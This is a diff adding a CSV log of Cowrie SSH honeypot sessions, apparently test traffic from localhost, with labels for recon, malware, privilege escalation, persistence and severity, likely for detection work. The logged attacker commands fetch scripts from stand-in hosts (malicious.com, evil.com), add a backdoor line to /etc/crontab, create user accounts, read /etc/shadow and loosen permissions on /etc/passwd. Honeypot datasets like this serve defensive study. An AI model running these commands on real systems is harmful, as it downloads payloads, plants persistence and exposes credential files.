@@ -1,0 +1,288 @@
+timestamp,eventid,src_ip,session,username,password,command,message,protocol,recon_activity,malware_activity,privilege_escalation,destructive_behavior,persistence_behavior,command_length,failed_command,severity
+2026-05-17T18:29:27.420740Z,cowrie.session.connect,127.0.0.1,da4482c69c46,,,,New connection: 127.0.0.1:48584 (127.0.0.1:2222) [session: da4482c69c46],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:29:27.425758Z,cowrie.client.version,127.0.0.1,da4482c69c46,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:29:27.432190Z,cowrie.client.kex,127.0.0.1,da4482c69c46,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:29:45.221953Z,cowrie.login.success,127.0.0.1,da4482c69c46,root,123123455,,login attempt [root/123123455] succeeded,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:29:45.291252Z,cowrie.client.size,127.0.0.1,da4482c69c46,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:29:45.292489Z,cowrie.client.var,127.0.0.1,da4482c69c46,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:29:45.293515Z,cowrie.client.var,127.0.0.1,da4482c69c46,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:29:45.296459Z,cowrie.session.params,127.0.0.1,da4482c69c46,,,,[],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:30:51.155913Z,cowrie.command.input,127.0.0.1,da4482c69c46,,,whoami,CMD: whoami,ssh,1,0,0,0,0,6,0,Low
+2026-05-17T18:30:51.159589Z,cowrie.command.input,127.0.0.1,da4482c69c46,,,uname -a,CMD: uname -a,ssh,1,0,0,0,0,8,0,Low
+2026-05-17T18:30:51.163787Z,cowrie.command.input,127.0.0.1,da4482c69c46,,,cat /etc/passwd,CMD: cat /etc/passwd,ssh,0,0,1,0,0,15,0,High
+2026-05-17T18:30:51.167083Z,cowrie.command.input,127.0.0.1,da4482c69c46,,,ps aux,CMD: ps aux,ssh,1,0,0,0,0,6,0,Low
+2026-05-17T18:30:51.176011Z,cowrie.command.input,127.0.0.1,da4482c69c46,,,netstat -an,CMD: netstat -an,ssh,1,0,0,0,0,11,0,Low
+2026-05-17T18:30:53.324466Z,cowrie.command.input,127.0.0.1,da4482c69c46,,,history,CMD: history,ssh,0,0,0,0,0,7,0,Normal
+2026-05-17T18:31:08.550043Z,cowrie.command.input,127.0.0.1,da4482c69c46,,,wget http://malicious.com/payload.sh,CMD: wget http://malicious.com/payload.sh,ssh,0,1,0,0,0,36,0,Medium
+2026-05-17T18:31:11.601588Z,cowrie.session.file_download,127.0.0.1,da4482c69c46,,,,Downloaded URL (http://malicious.com/payload.sh) with SHA-256 0581359a38b015c2ada4cf0f9d3c45ad6d11f5bc1bd9bf6a83e31b1b13976d3c to var/lib/cowrie/downloads/0581359a38b015c2ada4cf0f9d3c45ad6d11f5bc1bd9bf6a83e31b1b13976d3c,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:31:13.235975Z,cowrie.session.file_download,127.0.0.1,da4482c69c46,,,,Downloaded URL (http://evil.com/backdoor.sh) with SHA-256 dc4ca971c4c7df50c5aaee10082c75563151e4cabff67b0890156b4ea90379e0 to var/lib/cowrie/downloads/dc4ca971c4c7df50c5aaee10082c75563151e4cabff67b0890156b4ea90379e0,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:31:52.729352Z,cowrie.command.input,127.0.0.1,da4482c69c46,,,./payload.shexit,CMD: ./payload.shexit,ssh,0,1,0,0,0,16,0,Medium
+2026-05-17T18:31:52.730512Z,cowrie.command.failed,127.0.0.1,da4482c69c46,,,./payload.shexit ,Command not found: ./payload.shexit ,ssh,0,1,0,0,0,17,1,Medium
+2026-05-17T18:31:58.736527Z,cowrie.command.input,127.0.0.1,da4482c69c46,,,exit,CMD: exit,ssh,0,0,0,0,0,4,0,Normal
+2026-05-17T18:31:58.738799Z,cowrie.log.closed,127.0.0.1,da4482c69c46,,,,Closing TTY Log: var/lib/cowrie/tty/45d63988366d5fb2ed72247064638149561ca9e26efff74d6f1fa222d38ef219 after 133.4 seconds,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:31:58.756446Z,cowrie.session.closed,127.0.0.1,da4482c69c46,,,,Connection lost after 151.3 seconds,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:34:41.204407Z,cowrie.session.connect,127.0.0.1,2bb5a86b7093,,,,New connection: 127.0.0.1:54544 (127.0.0.1:2222) [session: 2bb5a86b7093],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:34:41.208420Z,cowrie.client.version,127.0.0.1,2bb5a86b7093,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:34:41.211985Z,cowrie.client.kex,127.0.0.1,2bb5a86b7093,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:34:47.643384Z,cowrie.login.success,127.0.0.1,2bb5a86b7093,root,98mn90,,login attempt [root/98mn90] succeeded,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:34:47.711091Z,cowrie.client.size,127.0.0.1,2bb5a86b7093,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:34:47.711452Z,cowrie.client.var,127.0.0.1,2bb5a86b7093,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:34:47.711700Z,cowrie.client.var,127.0.0.1,2bb5a86b7093,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:34:47.712336Z,cowrie.session.params,127.0.0.1,2bb5a86b7093,,,,[],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:35:03.801263Z,cowrie.command.input,127.0.0.1,2bb5a86b7093,,,nmap 192.168.211.129,CMD: nmap 192.168.211.129,ssh,0,0,0,0,0,20,0,Normal
+2026-05-17T18:35:03.802384Z,cowrie.command.failed,127.0.0.1,2bb5a86b7093,,,nmap 192.168.211.129,Command not found: nmap 192.168.211.129,ssh,0,0,0,0,0,20,1,Normal
+2026-05-17T18:35:24.210984Z,cowrie.command.input,127.0.0.1,2bb5a86b7093,,,wget http://malicious-site/payload.sh,CMD: wget http://malicious-site/payload.sh,ssh,0,1,0,0,0,37,0,Medium
+2026-05-17T18:35:31.943661Z,cowrie.command.input,127.0.0.1,2bb5a86b7093,,,./payload.shexit,CMD: ./payload.shexit,ssh,0,1,0,0,0,16,0,Medium
+2026-05-17T18:35:31.944598Z,cowrie.command.failed,127.0.0.1,2bb5a86b7093,,,./payload.shexit ,Command not found: ./payload.shexit ,ssh,0,1,0,0,0,17,1,Medium
+2026-05-17T18:35:35.786320Z,cowrie.command.input,127.0.0.1,2bb5a86b7093,,,exit,CMD: exit,ssh,0,0,0,0,0,4,0,Normal
+2026-05-17T18:35:35.788129Z,cowrie.log.closed,127.0.0.1,2bb5a86b7093,,,,Closing TTY Log: var/lib/cowrie/tty/1390b6b7a9b1893b7021ebd87f043e917f2099c621cd0fef466ef47b1e3c67a0 after 48.1 seconds,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:35:35.792497Z,cowrie.session.closed,127.0.0.1,2bb5a86b7093,,,,Connection lost after 54.6 seconds,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:36:17.887060Z,cowrie.session.connect,127.0.0.1,7be35f00199d,,,,New connection: 127.0.0.1:36956 (127.0.0.1:2222) [session: 7be35f00199d],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:36:17.888583Z,cowrie.client.version,127.0.0.1,7be35f00199d,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:36:17.890274Z,cowrie.client.kex,127.0.0.1,7be35f00199d,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:36:23.025173Z,cowrie.login.success,127.0.0.1,7be35f00199d,root,8hjnmpoi,,login attempt [root/8hjnmpoi] succeeded,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:36:23.059926Z,cowrie.client.size,127.0.0.1,7be35f00199d,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:36:23.060558Z,cowrie.client.var,127.0.0.1,7be35f00199d,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:36:23.061128Z,cowrie.client.var,127.0.0.1,7be35f00199d,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:36:23.062077Z,cowrie.session.params,127.0.0.1,7be35f00199d,,,,[],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:36:29.283628Z,cowrie.command.input,127.0.0.1,7be35f00199d,,,"echo ""* * * * * /tmp/backdoor.sh"" >> /etc/crontab","CMD: echo ""* * * * * /tmp/backdoor.sh"" >> /etc/crontab",ssh,0,0,0,0,1,49,0,High
+2026-05-17T18:36:37.461889Z,cowrie.command.input,127.0.0.1,7be35f00199d,,,useradd hacker,CMD: useradd hacker,ssh,0,0,0,0,1,14,0,High
+2026-05-17T18:41:23.046109Z,cowrie.session.file_download,127.0.0.1,7be35f00199d,,,,Saved redir contents with SHA-256 2ac500d84da46186c37cb612bf4589648a248eeb8e310bbaa794f2c03305a97a to var/lib/cowrie/downloads/2ac500d84da46186c37cb612bf4589648a248eeb8e310bbaa794f2c03305a97a,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:41:23.048095Z,cowrie.log.closed,127.0.0.1,7be35f00199d,,,,Closing TTY Log: var/lib/cowrie/tty/e275d92f078d1ade8059289c1719537ce4f157adeb87c5bcc021c279552987d5 after 300.0 seconds,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:41:23.050645Z,cowrie.session.closed,127.0.0.1,7be35f00199d,,,,Connection lost after 305.2 seconds,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:43:05.710906Z,cowrie.session.connect,127.0.0.1,6a57879b4d6f,,,,New connection: 127.0.0.1:53686 (127.0.0.1:2222) [session: 6a57879b4d6f],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:43:05.713386Z,cowrie.client.version,127.0.0.1,6a57879b4d6f,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:43:05.714997Z,cowrie.client.kex,127.0.0.1,6a57879b4d6f,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:43:16.399731Z,cowrie.login.success,127.0.0.1,6a57879b4d6f,root,878hvftg,,login attempt [root/878hvftg] succeeded,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:43:16.444938Z,cowrie.client.size,127.0.0.1,6a57879b4d6f,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:43:16.445729Z,cowrie.client.var,127.0.0.1,6a57879b4d6f,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:43:16.446464Z,cowrie.client.var,127.0.0.1,6a57879b4d6f,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:43:16.449313Z,cowrie.session.params,127.0.0.1,6a57879b4d6f,,,,[],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:44:15.223377Z,cowrie.command.input,127.0.0.1,6a57879b4d6f,,,whoami,CMD: whoami,ssh,1,0,0,0,0,6,0,Low
+2026-05-17T18:44:15.226246Z,cowrie.command.input,127.0.0.1,6a57879b4d6f,,,uname -a,CMD: uname -a,ssh,1,0,0,0,0,8,0,Low
+2026-05-17T18:44:15.231723Z,cowrie.command.input,127.0.0.1,6a57879b4d6f,,,cat /etc/passwd,CMD: cat /etc/passwd,ssh,0,0,1,0,0,15,0,High
+2026-05-17T18:44:15.234912Z,cowrie.command.input,127.0.0.1,6a57879b4d6f,,,ps aux,CMD: ps aux,ssh,1,0,0,0,0,6,0,Low
+2026-05-17T18:44:15.241329Z,cowrie.command.input,127.0.0.1,6a57879b4d6f,,,netstat -an,CMD: netstat -an,ssh,1,0,0,0,0,11,0,Low
+2026-05-17T18:44:15.245640Z,cowrie.command.input,127.0.0.1,6a57879b4d6f,,,wget http://malicious.com/payload.sh,CMD: wget http://malicious.com/payload.sh,ssh,0,1,0,0,0,36,0,Medium
+2026-05-17T18:44:17.215565Z,cowrie.session.file_download,127.0.0.1,6a57879b4d6f,,,,Downloaded URL (http://malicious.com/payload.sh) with SHA-256 0581359a38b015c2ada4cf0f9d3c45ad6d11f5bc1bd9bf6a83e31b1b13976d3c to var/lib/cowrie/downloads/0581359a38b015c2ada4cf0f9d3c45ad6d11f5bc1bd9bf6a83e31b1b13976d3c,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:44:17.952217Z,cowrie.session.file_download,127.0.0.1,6a57879b4d6f,,,,Downloaded URL (http://evil.com/backdoor.sh) with SHA-256 dc4ca971c4c7df50c5aaee10082c75563151e4cabff67b0890156b4ea90379e0 to var/lib/cowrie/downloads/dc4ca971c4c7df50c5aaee10082c75563151e4cabff67b0890156b4ea90379e0,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:45:43.387904Z,cowrie.command.input,127.0.0.1,6a57879b4d6f,,,exitexit,CMD: exitexit,ssh,0,0,0,0,0,8,0,Normal
+2026-05-17T18:45:43.389444Z,cowrie.command.failed,127.0.0.1,6a57879b4d6f,,,exitexit ,Command not found: exitexit ,ssh,0,0,0,0,0,9,1,Normal
+2026-05-17T18:45:48.772351Z,cowrie.command.input,127.0.0.1,6a57879b4d6f,,,exit,CMD: exit,ssh,0,0,0,0,0,4,0,Normal
+2026-05-17T18:45:48.774801Z,cowrie.session.file_download,127.0.0.1,6a57879b4d6f,,,,Saved redir contents with SHA-256 2ac500d84da46186c37cb612bf4589648a248eeb8e310bbaa794f2c03305a97a to var/lib/cowrie/downloads/2ac500d84da46186c37cb612bf4589648a248eeb8e310bbaa794f2c03305a97a,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:45:48.775931Z,cowrie.log.closed,127.0.0.1,6a57879b4d6f,,,,Closing TTY Log: var/lib/cowrie/tty/ca77caeebddf9d274e75235bf62315ea861cc5602de51330360b6ea9c6dffe3f after 152.3 seconds,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:45:48.779039Z,cowrie.session.closed,127.0.0.1,6a57879b4d6f,,,,Connection lost after 163.1 seconds,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:45:50.789613Z,cowrie.session.connect,127.0.0.1,f41884e81d66,,,,New connection: 127.0.0.1:47244 (127.0.0.1:2222) [session: f41884e81d66],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:45:50.791104Z,cowrie.client.version,127.0.0.1,f41884e81d66,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:45:50.792904Z,cowrie.client.kex,127.0.0.1,f41884e81d66,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:45:56.168396Z,cowrie.login.success,127.0.0.1,f41884e81d66,root,cfvgbqwe,,login attempt [root/cfvgbqwe] succeeded,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:45:56.217858Z,cowrie.client.size,127.0.0.1,f41884e81d66,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:45:56.218691Z,cowrie.client.var,127.0.0.1,f41884e81d66,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:45:56.219296Z,cowrie.client.var,127.0.0.1,f41884e81d66,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:45:56.220377Z,cowrie.session.params,127.0.0.1,f41884e81d66,,,,[],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:46:23.920763Z,cowrie.command.input,127.0.0.1,f41884e81d66,,,wget http://malicious.com/payload.sh,CMD: wget http://malicious.com/payload.sh,ssh,0,1,0,0,0,36,0,Medium
+2026-05-17T18:46:25.199759Z,cowrie.session.file_download,127.0.0.1,f41884e81d66,,,,Downloaded URL (http://malicious.com/payload.sh) with SHA-256 0581359a38b015c2ada4cf0f9d3c45ad6d11f5bc1bd9bf6a83e31b1b13976d3c to var/lib/cowrie/downloads/0581359a38b015c2ada4cf0f9d3c45ad6d11f5bc1bd9bf6a83e31b1b13976d3c,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:46:25.914332Z,cowrie.session.file_download,127.0.0.1,f41884e81d66,,,,Downloaded URL (http://evil.com/backdoor.sh) with SHA-256 dc4ca971c4c7df50c5aaee10082c75563151e4cabff67b0890156b4ea90379e0 to var/lib/cowrie/downloads/dc4ca971c4c7df50c5aaee10082c75563151e4cabff67b0890156b4ea90379e0,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:46:35.106094Z,cowrie.command.input,127.0.0.1,f41884e81d66,,,./payload.shexit,CMD: ./payload.shexit,ssh,0,1,0,0,0,16,0,Medium
+2026-05-17T18:46:35.107409Z,cowrie.command.failed,127.0.0.1,f41884e81d66,,,./payload.shexit ,Command not found: ./payload.shexit ,ssh,0,1,0,0,0,17,1,Medium
+2026-05-17T18:46:38.589785Z,cowrie.command.input,127.0.0.1,f41884e81d66,,,exit,CMD: exit,ssh,0,0,0,0,0,4,0,Normal
+2026-05-17T18:46:38.592376Z,cowrie.log.closed,127.0.0.1,f41884e81d66,,,,Closing TTY Log: var/lib/cowrie/tty/ea422e362384ec25b42e7893409116e368bd6d566af916c6cc6ed44f5e7ab947 after 42.4 seconds,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:46:38.597038Z,cowrie.session.closed,127.0.0.1,f41884e81d66,,,,Connection lost after 47.8 seconds,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:46:41.908710Z,cowrie.session.connect,127.0.0.1,eccfbde76a0d,,,,New connection: 127.0.0.1:50822 (127.0.0.1:2222) [session: eccfbde76a0d],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:46:41.911674Z,cowrie.client.version,127.0.0.1,eccfbde76a0d,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:46:41.912482Z,cowrie.client.kex,127.0.0.1,eccfbde76a0d,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:46:51.171380Z,cowrie.login.success,127.0.0.1,eccfbde76a0d,root,useradd attacker,,login attempt [root/useradd attacker] succeeded,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:46:51.230072Z,cowrie.client.size,127.0.0.1,eccfbde76a0d,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:46:51.230512Z,cowrie.client.var,127.0.0.1,eccfbde76a0d,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:46:51.230819Z,cowrie.client.var,127.0.0.1,eccfbde76a0d,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:46:51.231515Z,cowrie.session.params,127.0.0.1,eccfbde76a0d,,,,[],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:47:50.831201Z,cowrie.command.input,127.0.0.1,eccfbde76a0d,,,wget http://malicious.com/payload.sh,CMD: wget http://malicious.com/payload.sh,ssh,0,1,0,0,0,36,0,Medium
+2026-05-17T18:47:52.316440Z,cowrie.session.file_download,127.0.0.1,eccfbde76a0d,,,,Downloaded URL (http://malicious.com/payload.sh) with SHA-256 0581359a38b015c2ada4cf0f9d3c45ad6d11f5bc1bd9bf6a83e31b1b13976d3c to var/lib/cowrie/downloads/0581359a38b015c2ada4cf0f9d3c45ad6d11f5bc1bd9bf6a83e31b1b13976d3c,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:47:52.855396Z,cowrie.session.file_download,127.0.0.1,eccfbde76a0d,,,,Downloaded URL (http://evil.com/backdoor.sh) with SHA-256 dc4ca971c4c7df50c5aaee10082c75563151e4cabff67b0890156b4ea90379e0 to var/lib/cowrie/downloads/dc4ca971c4c7df50c5aaee10082c75563151e4cabff67b0890156b4ea90379e0,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:47:59.434147Z,cowrie.command.input,127.0.0.1,eccfbde76a0d,,,./payload.shuseradd attacker,CMD: ./payload.shuseradd attacker,ssh,0,1,0,0,1,28,0,High
+2026-05-17T18:47:59.435085Z,cowrie.command.failed,127.0.0.1,eccfbde76a0d,,,./payload.shuseradd attacker,Command not found: ./payload.shuseradd attacker,ssh,0,1,0,0,1,28,1,High
+2026-05-17T18:47:59.941510Z,cowrie.command.input,127.0.0.1,eccfbde76a0d,,,"echo ""* * * * * /tmp/backdoor.sh"" >> /etc/crontab","CMD: echo ""* * * * * /tmp/backdoor.sh"" >> /etc/crontab",ssh,0,0,0,0,1,49,0,High
+2026-05-17T18:48:06.418218Z,cowrie.command.input,127.0.0.1,eccfbde76a0d,,,exit,CMD: exit,ssh,0,0,0,0,0,4,0,Normal
+2026-05-17T18:48:06.420066Z,cowrie.session.file_download,127.0.0.1,eccfbde76a0d,,,,Saved redir contents with SHA-256 2ac500d84da46186c37cb612bf4589648a248eeb8e310bbaa794f2c03305a97a to var/lib/cowrie/downloads/2ac500d84da46186c37cb612bf4589648a248eeb8e310bbaa794f2c03305a97a,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:48:06.421278Z,cowrie.log.closed,127.0.0.1,eccfbde76a0d,,,,Closing TTY Log: var/lib/cowrie/tty/ef9b8784bfb82d5b74a38d40bf360c721b3e3483d5f5eb6a31b9965af1b19841 after 75.2 seconds,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:48:06.425907Z,cowrie.session.closed,127.0.0.1,eccfbde76a0d,,,,Connection lost after 84.5 seconds,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:48:09.165717Z,cowrie.session.connect,127.0.0.1,99e108dc6452,,,,New connection: 127.0.0.1:42018 (127.0.0.1:2222) [session: 99e108dc6452],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:48:09.169452Z,cowrie.client.version,127.0.0.1,99e108dc6452,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:48:09.170386Z,cowrie.client.kex,127.0.0.1,99e108dc6452,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:48:21.476628Z,cowrie.login.success,127.0.0.1,99e108dc6452,root,weras,,login attempt [root/weras] succeeded,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:48:21.525815Z,cowrie.client.size,127.0.0.1,99e108dc6452,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:48:21.526603Z,cowrie.client.var,127.0.0.1,99e108dc6452,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:48:21.527289Z,cowrie.client.var,127.0.0.1,99e108dc6452,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:48:21.528411Z,cowrie.session.params,127.0.0.1,99e108dc6452,,,,[],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:48:31.519516Z,cowrie.command.input,127.0.0.1,99e108dc6452,,,sudo su,CMD: sudo su,ssh,0,0,1,0,0,7,0,High
+2026-05-17T18:48:31.521996Z,cowrie.command.input,127.0.0.1,99e108dc6452,,,cat /etc/shadow,CMD: cat /etc/shadow,ssh,0,0,1,0,0,15,0,High
+2026-05-17T18:48:33.053207Z,cowrie.command.input,127.0.0.1,99e108dc6452,,,chmod 777 /etc/passwd,CMD: chmod 777 /etc/passwd,ssh,0,1,1,0,0,21,0,High
+2026-05-17T18:48:39.191354Z,cowrie.command.input,127.0.0.1,99e108dc6452,,,exit,CMD: exit,ssh,0,0,0,0,0,4,0,Normal
+2026-05-17T18:48:39.194346Z,cowrie.log.closed,127.0.0.1,99e108dc6452,,,,Closing TTY Log: var/lib/cowrie/tty/a74d8c8fd0d723b7f62ba4693645c435766b59fbcf5eeeab2276e7c6a1597712 after 17.7 seconds,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:48:39.197141Z,cowrie.session.closed,127.0.0.1,99e108dc6452,,,,Connection lost after 30.0 seconds,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:48:59.952807Z,cowrie.session.connect,127.0.0.1,a58452e1ba39,,,,New connection: 127.0.0.1:50550 (127.0.0.1:2222) [session: a58452e1ba39],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:48:59.955709Z,cowrie.client.version,127.0.0.1,a58452e1ba39,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:48:59.960318Z,cowrie.client.kex,127.0.0.1,a58452e1ba39,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:49:03.930279Z,cowrie.login.success,127.0.0.1,a58452e1ba39,root,tcvp12,,login attempt [root/tcvp12] succeeded,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:49:03.974886Z,cowrie.client.size,127.0.0.1,a58452e1ba39,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:49:03.975781Z,cowrie.client.var,127.0.0.1,a58452e1ba39,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:49:03.976495Z,cowrie.client.var,127.0.0.1,a58452e1ba39,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:49:03.977861Z,cowrie.session.params,127.0.0.1,a58452e1ba39,,,,[],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:49:10.414792Z,cowrie.command.input,127.0.0.1,a58452e1ba39,,,chmod +x payload.sh,CMD: chmod +x payload.sh,ssh,0,1,0,0,0,19,0,Medium
+2026-05-17T18:49:11.344477Z,cowrie.command.input,127.0.0.1,a58452e1ba39,,,./payload.sh,CMD: ./payload.sh,ssh,0,1,0,0,0,12,0,Medium
+2026-05-17T18:49:11.345498Z,cowrie.command.failed,127.0.0.1,a58452e1ba39,,,./payload.sh ,Command not found: ./payload.sh ,ssh,0,1,0,0,0,13,1,Medium
+2026-05-17T18:52:10.426873Z,cowrie.session.closed,127.0.0.1,a58452e1ba39,,,,Connection lost after 190.5 seconds,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:52:55.989583Z,cowrie.session.connect,127.0.0.1,640beb65f218,,,,New connection: 127.0.0.1:50990 (127.0.0.1:2222) [session: 640beb65f218],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:52:55.991560Z,cowrie.client.version,127.0.0.1,640beb65f218,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:52:55.996520Z,cowrie.client.kex,127.0.0.1,640beb65f218,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:53:01.618153Z,cowrie.login.success,127.0.0.1,640beb65f218,root,inmkpol,,login attempt [root/inmkpol] succeeded,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:53:01.669710Z,cowrie.client.size,127.0.0.1,640beb65f218,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:53:01.670834Z,cowrie.client.var,127.0.0.1,640beb65f218,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:53:01.671427Z,cowrie.client.var,127.0.0.1,640beb65f218,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:53:01.672451Z,cowrie.session.params,127.0.0.1,640beb65f218,,,,[],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:53:09.990027Z,cowrie.command.input,127.0.0.1,640beb65f218,,,root/root,CMD: root/root,ssh,0,0,0,0,0,9,0,Normal
+2026-05-17T18:53:09.991082Z,cowrie.command.failed,127.0.0.1,640beb65f218,,,root/root ,Command not found: root/root ,ssh,0,0,0,0,0,10,1,Normal
+2026-05-17T18:53:09.992865Z,cowrie.command.input,127.0.0.1,640beb65f218,,,admin/admin,CMD: admin/admin,ssh,0,0,0,0,0,11,0,Normal
+2026-05-17T18:53:09.993803Z,cowrie.command.failed,127.0.0.1,640beb65f218,,,admin/admin ,Command not found: admin/admin ,ssh,0,0,0,0,0,12,1,Normal
+2026-05-17T18:53:10.976013Z,cowrie.command.input,127.0.0.1,640beb65f218,,,root/toor,CMD: root/toor,ssh,0,0,0,0,0,9,0,Normal
